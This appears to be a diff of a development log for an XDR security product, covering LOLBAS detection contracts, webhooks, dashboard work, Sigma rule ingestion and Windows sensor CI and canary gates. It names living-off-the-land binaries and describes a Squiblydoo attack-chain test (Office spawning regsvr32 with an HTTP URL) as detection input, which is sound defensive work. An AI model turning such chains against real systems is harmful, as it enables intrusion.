-  SEQUENCE / PATTERN / ATTACK_TECHNIQUE / LOLBIN_CAPABILITY) and
-  `signal_strength` (OBSERVED / INFORMATIONAL / WEAK / MODERATE /
-  STRONG).
-- `lolbin.image` hit → `observation_type=LOLBIN`,
-  `signal_strength=OBSERVED`, `note="living-off-the-land binary is
-  a CAPABILITY, not a verdict"`.
-- Parent-child hits map tier→strength (NORMAL=INFORMATIONAL,
-  SUSPICIOUS=WEAK, ABNORMAL=MODERATE).
-- Attack-chain hits carry `signal_strength=STRONG` **AND** an explicit
-  "still EVIDENCE, correlation decides verdict" note.
-- Response includes a `contract` clause with the principle and a
-  deterministic `disposition` (OBSERVED / OBSERVED_WITH_SIGNAL /
-  CONTEXTUALIZED / CORRELATION_CANDIDATE) computed from aggregate
-  signal strength — **never a verdict**.
-
-**Non-regression gates** (`tests/test_xdr_lolbas.py`):
-- `test_lolbin_identity_is_capability_not_verdict` — bare LOLBIN →
-  OBSERVED · contract principle present · no `verdict` field ·
-  even Squiblydoo chain reaches at most CONTEXTUALIZED / STRONG hit
-  with "not a verdict" note.
-- `test_universal_parent_child_coverage_beyond_15` — verifies at
-  least one LOLBIN OUTSIDE the curated 15 (Atbroker / Cmstp / Cdb /
-  Presentationhost / etc.) has all three tiers indexed.
-
-**Live E2E evidence** on preview URL after fresh sync:
-- Bare `regsvr32.exe` → disposition **OBSERVED**, aggregate **0**.
-- `explorer → powershell → Get-Process` → **OBSERVED**, aggregate 1.
-- Full Squiblydoo `outlook → winword → regsvr32 + http URL` →
-  **CONTEXTUALIZED**, aggregate **7** (strongest LOLBAS-only case).
-- Non-curated `Cmstp.exe` (previously invisible to parent-child)
-  now emits suspicious parent-child hit for winword.exe parent +
-  userwritable_path CLI heuristic.
-
-**Full XDR test suite**: **56/56 pass** (17 LOLBAS + 11 secrets +
-5 audit + 14 rbac + 9 api-keys).  Ruff clean.
-
-**Queue** (per user's confirmed sequence):
-P0-5 Webhooks → P0-8 Collectors/Data Sources → RBAC retrofit sweep
-across every protected router → Phase B GTFOBins + LOLDrivers →
-Detection + Correlation Engine → OSINT/TI Hub.
-
-### P0-5 · Webhooks + Global Observation Contract · SHIPPED (this session)
-
-**Global observation contract** (`services/xdr_observation_contract.py`):
-- Codifies the capability-not-verdict principle as a platform-wide
-  reusable module (any future detection subsystem — GTFOBins,
-  LOLDrivers, Sigma, OSINT, IOC intel — imports from it).
-- Enum `ObservationType`: LOLBIN / LOLBIN_CAPABILITY / PARENT_CHILD /
-  SEQUENCE / PATTERN / IOC / ATTACK_TECHNIQUE / DETECTION /
-  CORRELATION / NEGATIVE_EVIDENCE / IDENTITY / NETWORK / FILE.
-- Enum `SignalStrength`: OBSERVED / INFORMATIONAL / WEAK / MODERATE /
-  STRONG with `STRENGTH_WEIGHT` numeric weights (max STRONG=5 so
-  a full LOLBAS chain aggregates only to ~7).
-- `compute_disposition()`: deterministic ladder OBSERVED →
-  OBSERVED_WITH_SIGNAL → CONTEXTUALIZED → CORRELATION_CANDIDATE.
-  NO evidence subsystem may produce a verdict from this module.
-- `contract_block()`: standard `{principle, note}` clause to attach
-  to every evidence response.
-
-**P0-5 Webhooks** (`routers/xdr_webhooks.py`):
-- Storage: `xdr_webhooks` + `xdr_webhook_deliveries`.
-- **HMAC-SHA256 signing**, secret persisted as **Fernet-encrypted
-  ciphertext in the webhook document using the P0-2 Secrets Store
-  helpers** (`_encrypt` / `_decrypt`).  Only `secret_preview` (last-6
-  chars) is ever returned in list/get responses.  Full plaintext
-  shown ONCE at create + rotate.
-- **Delivery engine** (`_emit_delivery`) with retry loop, HTTP
-  headers `X-NivXRay-Signature`, `X-NivXRay-Event`,
-  `X-NivXRay-Delivery-Id`, `X-NivXRay-Attempt`.  Final state one of
-  DELIVERED / FAILED / DLQ / RETRYING (transient).  **DELIVERED is
-  written only after an actual 2xx HTTP response** — never fabricated
-  on error/timeout/4xx/5xx.
-- **RBAC-gated** on every mutation via `require_permission(...)`
-  (`webhooks.create/update/delete/rotate/test`).
-- **Endpoints**: create, list, get, update, rotate-secret, delete,
-  test, deliveries (with `state=` filter), replay/{delivery_id}.
-- **`broadcast(tenant, event, payload)`** server-internal helper for
-  other backend services to fan events out to subscribed hooks.
-- **Audit actions**: `WEBHOOK_CREATED / UPDATED / ENABLED / DISABLED
-  / DELETED / SECRET_ROTATED / TEST_DELIVERY / REPLAY`.
-- Event subscription glob-lite (`ALERT_*`, `INCIDENT_CREATED`, `*`).
-
-**Tests** (`tests/test_xdr_webhooks.py`) — **9/9 passing**:
-- One-time secret reveal + hash-only persistence
-- Duplicate name rejected (409)
-- Test delivery → DELIVERED path (mocked 202); HMAC signature
-  independently reconstructed from the plaintext secret + body matches
-- Retry loop exhausts to **DLQ** (mocked persistent 503, 1 initial + 2
-  retries = 3 attempts, `attempt_count == 3`, `final_state == DLQ`,
-  `last_status == 503`).
-- **Replay** from DLQ produces a fresh delivery with `replay_of` set
-  and reaches DELIVERED when upstream now returns 200.
-- Rotate-secret produces a new plaintext (different from the original).
-- Disabled webhook refuses test delivery (409).
-- Tenant isolation.
-- Audit chain remains valid across the full lifecycle.
-
-**Admin UI** (`src/xdr/admin/WebhooksBody.jsx`):
-- Add / rotate-secret / test-delivery / deliveries panel (with per-
-  delivery replay) / enable-disable / delete.
-- One-time reveal modal with Copy + acknowledgement.
-- Every mutation surfaces the returned `audit_ref`.
-- Deployed to Vercel commit `6fc95f5`.
-
-**Full XDR test suite**: **65/65 pass** (audit-log 5 + secrets 11 +
-lolbas 17 + rbac 14 + api-keys 9 + webhooks 9).  Ruff clean.
-
-### Queue (per confirmed sequence)
-P0-8 Collectors + Data Sources → RBAC retrofit sweep across every
-protected router → Phase B GTFOBins + LOLDrivers → Detection +
-Correlation Engine (Admin → Detection → Rules / Correlation Rules /
-Pattern Rules / Content Packs / Testing / Replay / Versioning /
-Rollback) → OSINT/TI Hub (Admin → Intelligence → OSINT Providers).
-
----
-
-## 2026-02-08 · Phase A.2 · Platform Overview shipped as Visual Maturity benchmark
-
-### What shipped
-- **3 read-only aggregation endpoints** (no engine touched):
-  - `GET /api/admin/ioc/composition` — canonical IOC breakdown (hash/domain/ip/url/other) from `iocs` collection
-  - `GET /api/admin/data-sources/summary` — `xdr_data_sources` rolled up per kind with adopted/enabled/connected counts + `last_telemetry_at`
-  - `GET /api/admin/detection/summary` — `xdr_detection_rules` rolled up by category (content/network/endpoint/correlation/ioc/technique)
-  - Wired in `server.py` as `admin_aggregations_router` (new file `routers/admin_aggregations.py`)
-- **Nx chart primitives** (SVG, zero deps): `NxDonut`, `NxAreaSpark`, `NxHBar` — exported from `@/xdr/nx`
-- **Platform Overview page** (`/xdr/admin` overview) as the A.2 visual benchmark:
-  - Hero on canvas: eyebrow · title · description · right-side operational health chip
-  - 6-KPI strip fed by `/api/admin/stats` (Users · Shares · IOCs · Ops · OSINT · Detection Rules)
-  - Main analytical row: IOC Composition (donut+legend) · Operations Over Time (area, honest-empty when history absent) · LOLBAS Intelligence (h-bars + last-updated timestamp)
-  - Operational row: Data Sources Health table · Detection Content Summary distribution table · Administrator Insights (attention list derived from real state)
-  - Anti-fabrication footer band
-- **Anti-fabrication guarantees preserved**:
-  - Trend deltas ("↑ 12.4% vs last 7 days") only render when `/api/platform/timeseries` returns ≥2 snapshots
-  - Operations Over Time shows a designed "Historical trend not yet available" state, not a fake chart, when snapshots < 2
-
-### Incident Record composition (also shipped this session)
-- Hero replaced with single operational **attention statement** (e.g. "Investigation in progress · verdict pending", "Awaiting first analyst · Unassigned for 43d") instead of a 5-metric KPI wall
-- Executive tab: "Not yet investigated" designed truth-state block replaces mechanical `NOT_RUN / — / —` cards
-- Lifecycle strip compressed to a subordinate pill trail so the tab panel becomes the visible focal point
-- Engineering copy (`workspace_cases.live`) removed from the hero
-
-### Pending — do not start without user confirmation
-- **§17 + §18 of NIVXRAY_VISUAL_GRAMMAR.md** — codify the six page families + chart primitive grammar + honest-aggregate data contract once Platform Overview visual review is accepted
-- **Phase A.2 propagation** (per user's sequenced plan): MSS Dashboard → Rule Studio → Knowledge Base (using the §17-18 rules)
-- Phase 3 (Lifecycle/SLA), Phase 4 (Live provenance), Phase 5+ still frozen
-
-### Visual review checkpoint
-The Platform Overview at `/xdr/admin` is the acceptance test for the whole Phase A.2 objective. The single question: **"Does this now look like a mature enterprise XDR product?"** If yes → codify §17-18 → propagate. If no → iterate before propagation.
-
----
-
-## 2026-02-08 (afternoon) · Whole-product visual maturity pass + partial functional cleanup
-
-### Visual transformation (all shipped)
-- Introduced shared `nx-page.css` + `NxPageShell` + `NxSurface` + `NxKpi` + `NxEmptyBlock` + `NxPill` primitives so every page family composes from one vocabulary
-- MSS Dashboard fully redesigned as SOC Command Center — 6-lens attention strip, distribution surface, priority queue, workload/customer tables, h-bar detection sources/techniques, activity feed, auto-investigation status
-- Global uplift on `.xdr-console`: elevated `.page-h1`/`.page-sub`/`.panel`/`.stat-card`/`.btn`/`.badge`/`.prio`/`.status-pill`/`.x-table`/`.dom-badge`/`.tag-pill`/`.x-empty` base classes so every legacy page inherits Platform-Overview quality without JSX rewrites
-- Reserved intel pages (Threat / IOC / Command / Malware / KB) redesigned as product "Coming Soon" teasers — hero + tagline + "what this workspace will do" bullet list, no more `/api/threat-intel/*` endpoint listings or engineering copy
-- Purged developer copy across the product: `NATIVE XDR · CONSUMES /api/...`, `never re-implements`, `workspace_cases.live`, `every unavailable column renders honestly`, `AWAITING PHASE 4 ENGINE-EXECUTION LEDGER`, `projection · never runs an engine`, etc.
-
-### Operational fixes (this session)
-- Bulk-enabled all seed detection rules: 81/93 promoted to `state=VALIDATED` + `lifecycle_state=ACTIVE` + `enabled=true` (12 remain `LICENSE_BLOCKED` — legally restricted, honest state)
-- Correlation rules already 5/5 enabled
-
-### Still needs a follow-up round (called out by user)
-- **Nav redirects**: user reports that a few sidebar tabs redirect to Incidents/Dashboard. Root cause candidates: (a) `/xdr/dashboard` → `<Navigate to="/xdr/incidents">` legacy redirect, (b) `/xdr/endpoints` → `<Navigate to="/xdr/incidents">` legacy redirect. Sidebar `disabled:true` items (SLA/Aging, Response, Investigation Workspace, Evidence Explorer, Entity Search, Attack Story) correctly render as `<button disabled>` so they should NOT navigate — need user to specify which exact sidebar labels misbehave.
-- **NOT_WIRED sidebar chips**: many admin capabilities (Collectors, Agents, Telemetry Studio, Parsers, Normalization, Response Policies, API/Webhooks, Platform Health, etc.) surface `NOT_WIRED` because their backends genuinely aren't wired — the anti-fabrication contract requires this honest state. Softening these into designed "Not yet available" blocks (like the reserved intel pages) is a separate follow-up.
-- **Threat Intelligence not populating**: TI is `reserved:` in the sidebar and routes to the coming-soon placeholder — the TI backend/pipeline is a Phase 6 backlog item, not a bug.
-- **"Active Rules: 0" counter in Detection Registry**: the counter binds to a different metric than `enabled`/`lifecycle_state` (likely execution count or a dedicated `active` flag on a stats endpoint). Needs a targeted backend inspection to align.
-
-### Next Action Items (for user pick)
-- Nav specifics: which exact sidebar labels redirected wrong so we can pinpoint the mis-routed link
-- NOT_WIRED softening: Should we turn every `NOT_WIRED` admin block into a "Coming soon" teaser like the intel pages?
-- Rule "Active" counter: Should I wire the counter to `lifecycle_state=ACTIVE` so it reflects the just-promoted 81 rules?
-- TI/IOC/Malware Intelligence: Are you ready to lift the freeze on these so we can start real implementation?
-
----
-
-## 2026-02-08 (evening) · Phase A.3 · Immediate-priority page composition redesigns
-
-Delivered three trust-critical page redesigns called out by user:
-
-**Detection Registry — trust fix**
-- `active_rules` counter was querying the nonexistent `state="ACTIVE"` while the schema uses `state=VALIDATED` + `lifecycle_state=ACTIVE`
-- Fixed backend query in `xdr_detection_content.py::status` to count `enabled=true AND state IN [VALIDATED, ACTIVE]`
-- ACTIVE RULES now shows 81 (was 0) — trust restored
-
-**MITRE ATT&CK Coverage Intelligence — complete redesign**
-- Replaced the 14-column heatmap (which set `minWidth: 2128px` and overflowed horizontally at any viewport under 1600px) with a two-pane Coverage Intelligence workspace
-- Hero + 5-KPI attention strip (Coverage % · Techniques Observed · Rules Mapped · Incidents Scanned · Coverage Gaps)
-- Left pane: expandable tactic list — each tactic shows its coverage bar, `observed/total` and detection count, click to reveal the techniques beneath it
-- Right pane: technique detail panel — id + tactic + observation state pill + coverage summary (Detections/Incidents/Rules Mapped) + observed-incidents list with priority pills + related techniques + attack.mitre.org link
-- Fits cleanly at 1440px, no horizontal page overflow
-
-**Incidents Operations workspace — composition upgrade**
-- Inserted an operational-intelligence band between the priority strip and the queue toolbar
-- Three cards: **Incident distribution** (state + priority h-bars) · **Aging & SLA exposure** (SLA-at-risk + Unassigned exposure tiles + age-bucket h-bars for 7-30/30-90 days) · **Workload & assignment** (top owners h-bar with unassigned first)
-- All computed client-side from `rows` — no new endpoint, no fabricated metrics
-- Fills the previously empty canvas with meaningful operational intelligence
-
-### Still to do (Phase A.3 batches continuing)
-- Rule Studio → Detection Engineering workstation (split-pane editor + rule intelligence)
-- Correlation Rules → Correlation Intelligence workspace
-- Detection Engineering → Content Control Center
-- Investigation Workspace / Evidence Explorer / Entity Search / Attack Story / Device Trajectory
-- Admin sub-pages (Audit Log, Users & Roles, Data Sources, Collectors, Telemetry, Parsers, Normalization, Response Policies, API Keys, Webhooks, Platform Health)
-- NOT_WIRED chip softening into "Coming soon" teasers
-- Nav redirects (waiting on user to specify which exact tabs misroute)
-
----
-
-## 2026-02-08 (night) · P0 Operational Fabric · Phase-1 scaffolding
-
-**Directive received:** Freeze visual work. Build NivXRay XDR Operational Fabric (Data · Engine · Content · Investigation · Response fabrics). No fabricated records, no UI-only integrations, ACTIVE ≠ "row exists".
-
-### Repository audit completed
-- **30+ engine implementations** discovered across `canonical/`, `services/`, `engine/`: IUE, DIE, UAIE, Verdict Stage2, correlation_engine, evidence_graph, chain_analyzer, command_analyzer, shellcode_analyzer, amsi_detector, corrupt_payload_detector, pe_analyzer, mitre_mapper, behavior_extractor, lolbin_v2, verdict_v2, decoders (magic/llm/smart), cmd/powershell interpreters + parsers, ps normalizers, IUE Lanes A/B/C, orchestrator, golden_corpus (5 modules), Nivxforge `Engine(Protocol)` runtime contract
-- **Real content counts:** `xdr_detection_rules`=93 · `xdr_correlation_rules`=5 · `xdr_lolbas_primitives`=11,196 (this is where "3,000+" perception came from) · `xdr_lolbas_entries`=242 · `iocs`=91,479 · `xdr_detection_versions`=810
-- **Data fabric records vs reality:** 110 collectors + 22 data sources exist as records but only 280 canonical events + 2 response executions have been proven end-to-end
-- **Sigma tooling already partially present:** `sigma_generator.py`, `sigma_export.py`, `routers/sigma.py`, `fixtures/detection/sigma_snapshot.json`
-
-### Shipped this session (Phase-1 scaffolding for the Content Fabric)
-- **Canonical `detection_content` model** (`backend/detection_content/model.py`) with 18-state lifecycle enum · 7 ContentSource values · `can_promote_to_active()` guardrail so nothing reaches ACTIVE without accumulating required milestones (PARSED · VALID · SUPPORTED · EXECUTION_READY · ENABLED)
-- **SigmaHQ ingester** (`backend/detection_content/sigma_ingest.py`) — walks a cloned Sigma tree, parses YAML, records DISCOVERED/PARSED/VALID/INVALID/SUPPORTED/UNSUPPORTED/FIELD_MAPPING_MISSING/ENGINE_UNBOUND milestones per rule, extracts ATT&CK tags + required fields + logsource + platform, emits an authoritative per-milestone compatibility report
-- **API endpoints** `GET /api/admin/content-supply-chain/report` + `/samples` — read-only, return honest zero-report when nothing ingested
-- **Proven end-to-end** on a real Sigma rule (T1105 Certutil Download) — state history: `[DISCOVERED, PARSED, VALID, SUPPORTED, ENGINE_UNBOUND]`
-
-### Next slice sequencing (feature freeze on visual work remains)
-1. **P0.2a — Real SigmaHQ ingestion**: `git clone https://github.com/SigmaHQ/sigma` to a persistent path (e.g. `/var/nivxray/content/sigma`), run the ingester across the full 3,000+ rule corpus, produce the authoritative compatibility report
-2. **P0.2b — pySigma integration**: replace the YAML fallback with pysigma-based parsing so we honor the Sigma spec strictly (backend/requirements addition)
-3. **P0.2c — Engine binding phase**: walk the discovered engine set (30+ implementations), define engine capability contracts, bind each SUPPORTED rule to the engine that can execute it, promote to ENGINE_BOUND
-4. **P0.2d — Execution test harness**: run each ENGINE_BOUND rule against the existing golden_corpus, promote passing rules to TEST_PASSED → EXECUTION_READY
-5. **P0.1 — Engine Registry**: authoritative `xdr_engines` collection consuming the discovered engine inventory, real state (DISCOVERED → REGISTERED → CONFIGURED → DEPS_RESOLVED → READY → CONNECTED → EXECUTING/DEGRADED/ERROR)
-6. **P0.3 — Collector Fabric with real state**: turn the 110 collector records into lifecycle-driven runtime
-7. **P0.4 — End-to-end replay acceptance test**
-8. **P0.5 — Platform Health becomes mathematical**
-
----
-
-## 2026-02-08 (late) · P0.2 · Engine Registry Phase-1 shipped
-
-### What shipped
-- `detection_content/engine_registry.py` — canonical `EngineRole` enum (17 roles) + `EngineState` enum (10-state lifecycle)
-- `detection_content/engine_classifier.py` — source-code-driven classifier that walks `canonical/`, `services/`, `engine/`, `decoders/`, `workspace/` and assigns each module its ACTUAL role (never assumes DETECTION_ENGINE)
-- Populated `xdr_engines` collection with **329 real classifications**
-- API endpoints: `GET /api/admin/content-supply-chain/engines/report` + `/engines/list`
-
-### Real classified inventory (from source, not from acronyms)
-| Role | Count |
-|---|---|
-| VERDICT_ENGINE | 7 |
-| CORRELATION_ENGINE | 3 |
-| GRAPH_ENGINE | 6 (evidence_graph, exec_graph, process_tree) |
-| EVIDENCE_ENGINE | 6 |
-| ANALYZER | 13 (pe, elf, office, shellcode, behavior_extractor, …) |
-| INTELLIGENCE_ENGINE | 25 (lolbas, iocs, attack_chain, attack_story, mitre, kb, …) |
-| PARSER | 10 |
-| DECODER | 62 |
-| INTERPRETER | 2 (cmd, powershell) |
-| NORMALIZER | 2 |
-| ORCHESTRATOR | 2 |
-| PLANNER | 3 |
-| PROTOCOL | 4 |
-| **DETECTION_ENGINE** | **0** — honest state; no module currently exposes a detection-engine capability contract |
-| OTHER | 184 (models, helpers, utilities) |
-
-**All 329 engines currently at `state=DISCOVERED`** — no fake READY/CONNECTED promotions. Every promotion beyond DISCOVERED requires the subsequent slice's real dependency resolution + runtime readiness check.
-
-### The critical honest finding
-The Sigma rule ingested earlier reached `ENGINE_UNBOUND` — that state is correct. NivXRay currently has 0 modules exposing a `DETECTION_ENGINE` capability contract. Binding Sigma content requires either:
-- **Option A**: designate one or more existing ANALYZERs / INTERPRETERs (e.g. `services/behavior_extractor`, `engine/interpreters/powershell_interpreter`, `engine/detectors/*`) as detection-execution capable and wire their capability contract, OR
-- **Option B**: build a new NivXRay Sigma-execution engine that consumes canonical evidence and executes Sigma detection semantics
-
-Neither is silent — both require a real capability contract + execution test harness (P0.2c/P0.2d).
-
-### Explicit remaining P0 blockers
-1. **P0.2b — pySigma parsing** (replace permissive YAML fallback, honor Sigma spec exactly)
-2. **P0.2c — Engine capability contracts** — for each of the 7 VERDICT/3 CORRELATION/13 ANALYZER modules, define input/output contracts machine-readably
-3. **P0.2d — Rule↔engine binding matrix** based on capability compatibility (not "bind everything to everything")
-4. **P0.2e — Execution test harness** using the existing golden_corpus
-5. **P0.2f — Full SigmaHQ ingest** (`git clone https://github.com/SigmaHQ/sigma` → run the full ingester)
-6. **P0.3 — Collector Fabric with real lifecycle** (turn 110 collector records into runtime state)
-7. **P0.4 — End-to-end replay acceptance test**
-8. **P0.5 — Platform Health becomes mathematical**
+Commands/event: `edr_delivery_counters` update x3; `edr_raw_events` findAndModify+insert
++update x2+find = 5; `edr_endpoints` find+update = 2; `v2_shadow_observations` find+insert
+= 2; `xdr_canonical_evidence` insert; **`xdr_correlation_rules` aggregate + find PER
+EVENT**; +~4 more. cProfile agrees independently: 0.726s of 1.189s across 25 events was
+`select.epoll.poll` — I/O WAIT, not CPU — and showed YAML/regex work consistent with the
+per-event rule reads.
+**RECOMMENDATION: do NOT batch the delivery counters on their own** — 3.8% is a rounding
+error on the acceptance path. Ranked, NONE IMPLEMENTED: (1) cache the correlation rule
+set (2 cmds/event; rules are configuration not evidence; also removes the YAML/regex
+cost) — best value-to-risk, needs a decision on how fast a rule edit must take effect;
+(2) reduce `edr_raw_events` to <5 cmds — touches the immutable-bytes + dedup guarantee,
+needs its own design review; (3) aggregate 3 counter writes into 1 (`counters.record`
+already accepts a delta dict) — ~4%, only worth doing ALONGSIDE (1). Items 1+3 ≈ 19→16
+cmds, 30.3→~27 ms (+12%) — real but far smaller than the banked transport win
+(5.7→48.3 ev/s). Counters stay operational metrics (`authority: SERVER_OBSERVED`,
+`evidence_authority: false`) and batching must not change WHEN an event is accepted.
+**CAVEAT: 30.3 ms is local loopback preview Mongo with no HTTP/TLS/auth in the number —
+re-profile on the canary before changing anything.**
+
+**No product code changed in this pass** (the selftest + GATE 0 workflow step landed in
+the previous pass). NEW: `scripts/b5gap1_ingest_cost_profile.py`. Regression spot-check
+after the pass: 137 passed (pre-canary + 3 installer suites + enrolment hardening).
+
+### Next (owner-gated, in order)
+- P0: Save to Github -> run `windows-sensor-installer.yml` on `windows-latest`. GATE 0
+  fails the build unless `result: PASS` AND `frozen: true` AND `wal_mode: true` AND
+  `synchronous_full: true`. Capture artifact SHA256 + run id.
+- P0: canary on a DISPOSABLE validation Windows endpoint FIRST, not `DESKTOP-A9HGFJJ`
+  (owner's call, and correct): hammer Sysmon, cut/restore backend, restart service,
+  grow/drain journal. Procedure in `B5_GAP_1_PREPROD_HARDENING_GATES_A_D.md`.
+- P1: rule-set caching (profile item 1), optionally with counter aggregation (item 3).
+- P1: render acquisition integrity / gaps in the console.
+- P1: E3 deterministic detection engine hardening.
+
+## 2026-06 · B5-GAP-1 WINDOWS GATE 0 — DETERMINISTIC CI CONTRACT (owner-gated)
+
+Owner decision accepted: close Windows Gate 0 BEFORE any backend optimization. No
+correlation-rule cache, no counter batching, no `edr_raw_events` change, no integrity UI,
+no Sysmon change, no canary, `DESKTOP-A9HGFJJ` untouched, nothing deployed.
+
+Gate 0 status: **BLOCKED_PENDING_REAL_WINDOWS_CI** (not claimed PASS). The container
+cannot run GitHub Actions or a `windows-latest` runner, so this pass made the owner's
+single CI run self-verifying instead of log-interpreted.
+
+Implemented:
+- `agents/nivxforge-windows/nivxforge_setup.py` — `journal-selftest` rewritten into the
+  full Gate-0 evidence emitter: module provenance (nivxforge_sensor / nivxforge_journal /
+  sqlite3 / _sqlite3 must resolve INSIDE the frozen bundle), native `_sqlite3` binary on
+  disk, SQLite runtime binaries found, volume filesystem (NTFS assertion), `-wal` file
+  creation, WAL reopen/recovery, state-dir write access, service-permission (icacls)
+  check, plus the existing WAL/FULL/INCREMENTAL/schema/durable-commit/cursor/replay/
+  integrity-snapshot/gap-contract checks. New `--json-out` and `--restart-check` flags;
+  `--restart-check` re-opens the SAME dir in a NEW process (the only honest frozen-restart
+  proof) and refuses to guess a directory. Off Windows, Windows-only checks report the
+  literal `N/A_NON_WINDOWS` — never PASS, so Linux can never be promoted to Windows
+  evidence. A `gate0` verdict map emits the owner's exact field names.
+- `.github/workflows/windows-sensor-installer.yml` — Gate 0 split into (a) run both
+  selftest phases from the frozen EXE, (b) an `if: always()` report step that FAILS CLOSED:
+  every mandatory field must be PRESENT and exactly `PASS`, both phases must report
+  `WINDOWS_FROZEN = TRUE`, restart recovery must come from the RESTART phase, packaging
+  provenance is re-checked, and a missing field is a failure. Produces
+  `dist/gate0/GATE0_WINDOWS_REPORT.json` (verdicts + artifact filename/version/SHA256/
+  service-host SHA256/commit/run id/timestamp/PyInstaller version/signing status +
+  the standing NO flags), printed, written to the job summary, and uploaded.
+- `docs/B5_GAP_1_WINDOWS_GATE0_CI_CONTRACT.md` — the contract + paste-back procedure.
+- `docs/B5_GAP_1_CANARY_PLAN.md` — PREPARED, NOT RUN: 11-stage measurement pipeline,
+  per-stage metric list, 10-scenario failure matrix, acceptance invariants, rollback
+  criteria, STOP conditions, post-canary optimization decision rule.
+- `backend/tests/edr/test_b5_gap1_windows_gate0_ci_contract.py` (14 tests) + updated
+  workflow-wiring assertion in the pre-canary suite. 102 passed / 2 skipped for
+  `-k b5_gap1`. A local PyInstaller ONEFILE freeze ran both phases from a genuinely
+  frozen binary (frozen=true, provenance in-bundle, restart phase PASS) — mechanics only,
+  NOT Gate-0 proof.
+
+### Next (owner-gated, in order)
+- P0: Save to GitHub -> run `windows-sensor-installer.yml` on `windows-latest` -> paste
+  `GATE0_WINDOWS_REPORT.json` back. Gate 0 closes only on `GATE0_VERDICT = CLOSED_PASS`.
+- P0: only then, disposable Windows canary per `B5_GAP_1_CANARY_PLAN.md`.
+- P1: optimize ONLY what canary measurements prove dominant (rule-read caching is a
+  candidate, not an approved change).
+- P1: acquisition-integrity surfacing in the console; E3 detection-engine hardening.
+
+## 2026-06 · B5-GAP-1 WINDOWS GATE 0 CLOSED + DISPOSABLE CANARY PACKAGE (prepared, NOT run)
+
+Owner supplied the authoritative `gate0/GATE0_WINDOWS_REPORT.json` from the real
+`windows-latest` run (run 36663297037, commit 2cb841db, PyInstaller 6.11.1, sensor
+0.3.0-windows, UNSIGNED_INTERNAL_VALIDATION_BUILD). Recorded:
+`WINDOWS_GATE_0 = CLOSED_PASS`, `PROBLEMS = []`, all 21 mandatory Windows assertions
+PASS (SQLite + native binary, NTFS create, WAL create + reopen/recovery,
+synchronous=FULL, auto_vacuum=INCREMENTAL, schema, durable commit, cursor commit,
+replay idempotency, integrity snapshot, gap contract, frozen restart, state-dir access,
+service permissions, packaging regression). Evidence written into
+`docs/B5_GAP_1_WINDOWS_GATE0_CI_CONTRACT.md` §8. No inference from the green job was
+accepted; the previous turn deliberately reported UNVERIFIED until the JSON arrived.
+
+Phase 2 (prepared, NOT executed):
+- `scripts/canary/b5gap1_canary_collector.py` — READ-ONLY collector. Samples SOURCE ->
+  ACQUISITION -> JOURNAL -> NORMALIZATION -> BATCH TRANSPORT -> BACKEND INGEST -> RAW
+  ACCEPTANCE -> CANONICAL -> ACK -> JOURNAL RELEASE into a timestamped CSV (48 columns,
+  one row per sample per channel) plus a verdict JSON. Journal opened `mode=ro`, falling
+  back to an untouched copy of db/-wal/-shm; unreadable numbers are `NOT_PROVABLE`, never
+  estimated. Read token from `NIVX_CANARY_READ_TOKEN`, never printed or stored.
+  Invariants enforced: SILENT_LOSS, UNEXPLAINED_ACQUISITION_GAPS, DUPLICATES,
+  WRONG_TENANT_EVIDENCE, UNACKNOWLEDGED_DELETION, CURSOR_MONOTONIC,
+  SOURCE_CURSOR<=DURABLY_OWNED, acquisition-continues-while-impaired, backlog drain,
+  all-channels-progress, explicit journal pressure, JOURNAL_NOT_CORRUPT. Reports
+  DELIVERY_HEADROOM without asserting a threshold (owner decision).
+- `scripts/canary/b5gap1_canary_load.ps1` — real source records on the canary; REFUSES
+  `DESKTOP-A9HGFJJ` and any host not named `NVX-CANARY*` without `-Confirm`.
+- `scripts/canary/b5gap1_canary_impair.py` — transparent TCP relay (`normal|slow|down|
+  cut`); TLS stays end-to-end, no credential held, reversible via hosts entry.
+- `docs/B5_GAP_1_CANARY_PLAN.md` rewritten as an executable plan: 10 scenarios with exact
+  commands, CSV + verdict schemas, acceptance invariants, rollback criteria, STOP
+  conditions, post-canary optimization rule.
+- Backend cost measurement REUSES `scripts/b5gap1_ingest_cost_profile.py`. No ingest
+  middleware, no sensor hot-path instrumentation, no product semantics changed.
+- `backend/tests/edr/test_b5gap1_canary_harness.py` (20 tests) proves the harness fails
+  closed on cursor regression, cursor beyond durable ownership, unacknowledged deletion,
+  unexpected duplicates, an absorbed discontinuity, an undrained backlog, foreign-tenant
+  evidence, stalled acquisition under impairment and journal corruption — and that the
+  collector leaves the journal bytes untouched while a live writer holds the WAL.
+  Regression: 122 passed / 2 skipped for `-k "b5_gap1 or b5gap1"`.
+
+Boundary preserved: CANARY_STARTED = NO, CORRELATION_CACHE_IMPLEMENTED = NO,
+COUNTER_BATCHING_IMPLEMENTED = NO, RAW_EVENT_PATH_MODIFIED = NO,
+DESKTOP_A9HGFJJ_TOUCHED = NO, PRODUCTION_DEPLOYED = NO.
+
+Lifecycle: B5_STATUS = CLOSED_PASS · B5_GAP_1_IMPLEMENTATION = PASS ·
+B5_GAP_1_WINDOWS_ARTIFACT = PASS · B5_GAP_1_DISPOSABLE_CANARY = PENDING.
+B5-GAP-1 is NOT fully closed until the canary passes.
+
+### Next (owner-gated, in order)
+- P0: owner authorises a named disposable Windows host -> run the 10 canary scenarios.
+- P0: owner review of canary CSV/verdicts; only then decide any optimization.
+- P1: correlation-rule cache ONLY if canary profiling proves it material.
+- P1: acquisition-integrity surfacing in the console; E3 detection-engine hardening.
+
+## 2026-06 · B5-GAP-1 CANARY PHASE C0 CONTRACT (host KUSHU authorised; nothing installed yet)
+
+Owner authorised KUSHU as the disposable canary (baseline verified CLEAN: no NivXForge
+service, no Sysmon service/channel/binaries, no C:\NivX, no C:\Program Files\NivXForge,
+no C:\ProgramData\NivXForge, x64, ~190 GB free). DESKTOP-A9HGFJJ remains out of scope.
+
+Repository-authoritative answers recorded in `docs/B5_GAP_1_CANARY_PLAN.md` §0:
+- The NivXForge installer does NOT install or configure Sysmon (no Sysmon logic in
+  `nivxforge_setup.py` or `Install-NivXForgeSensor.ps1`).
+- Authoritative Sysmon config = the W1 baseline XML (`memory/W1_PHASE1_WINDOWS_LAPTOP_PREP.md`
+  §1.3) written to `C:\NivX\sysmon\nivx-w1-sysmon.xml`, with the single validated B5 change
+  `ProcessTerminate onmatch="exclude"` so EID 5 is ON from the start. `docs/B5_EID5_ENABLE_AND_VERIFY.ps1`
+  is pinned to DESKTOP-A9HGFJJ and must never run on the canary.
+- Artifact: Gate-0 run 36663297037 / commit 2cb841db, sensor 0.3.0-windows, expected SHA256
